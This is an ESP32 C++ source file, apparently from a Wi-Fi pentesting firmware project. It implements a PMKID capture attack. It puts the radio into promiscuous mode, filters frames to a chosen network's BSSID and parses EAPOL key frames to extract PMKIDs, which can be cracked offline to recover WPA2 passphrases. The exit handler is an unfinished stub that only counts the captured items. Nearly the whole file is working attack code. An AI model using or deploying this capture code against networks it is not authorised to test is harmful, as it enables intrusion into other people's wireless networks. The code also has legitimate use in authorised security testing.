#include "Pmkid.h"
#include "esp_wifi.h"

#include "api/event/EspEvent.h"
#include "core/LedManager.h"
#include "core/Logger.h"
#include "models/wifi/select/WifiSelect.h"
#include "models/wifi/utils/utils.h"
#include "models/wifi/types/frame.h"

static const char *TAG = "Wifi-Attack-Pmkid";

void WifiAttackPmkid::start(const char *ssid) {
    wifi::turnModeAPSTA();

    esp_wifi_set_promiscuous(true);
    wifi::wifiFilterFrameTypes(true, true, false);
    esp_wifi_set_promiscuous_rx_cb(&onPacketReceived);

    esp_event_handler_register(
        ESP_FRAME_EVENT,
        DATA_FRAME_EVENT_PMKID,
        &pmkidExitConditionHandler,
        nullptr
    );

    LedManager::setStatus(LedStatus::Error);
    LOG_I(TAG, "WiFi attack pmkid started");
}

void WifiAttackPmkid::stop() {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);

    esp_event_handler_unregister(ESP_FRAME_EVENT, DATA_FRAME_EVENT_PMKID, &pmkidExitConditionHandler);

    wifi::disableModeAPSTA();

    LedManager::setStatus(LedStatus::Successful);
    LOG_I(TAG, "WiFi attack pmkid stopped");
}

void WifiAttackPmkid::onPacketReceived(void *buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *)buf;

    if(!WifiSelect::hasNetwork()) return;
    const WifiNetworkInfo* selectNetwork = WifiSelect::getNetwork();

    if (!wifi::isFrameBssidMatching(frame, selectNetwork->bssid)) return;

    EapolPacket *eapolPacket = wifi::parseEapolPacket((DataFrame *)frame->payload);
    if (eapolPacket == NULL) return;

    EapolKeyPacket *eapolKeyPacket = wifi::parseEapolKeyPacket(eapolPacket);
    if (eapolKeyPacket == NULL) return;

    PmkidItem *pmkidItems;
    if((pmkidItems = wifi::parsePmkid(eapolKeyPacket)) == NULL){
        return;
    }

    esp_event_post(
        ESP_FRAME_EVENT,
        DATA_FRAME_EVENT_PMKID,
        &pmkidItems,
        sizeof(PmkidItem *),
        portMAX_DELAY
    );
}

void WifiAttackPmkid::pmkidExitConditionHandler(void *args, esp_event_base_t eventBase, int32_t eventId, void *eventData) {
    LOG_I(TAG, "Got PMKID, stopping attack...");

    //Add stop PMKID attack


    PmkidItem *pmkidItemHead = *(PmkidItem **) eventData;

    PmkidItem *pmkidItem = pmkidItemHead;

    unsigned pmkidItemCount = 1; 
    while((pmkidItem = pmkidItem->next) != NULL){
        pmkidItemCount++;
    }
}
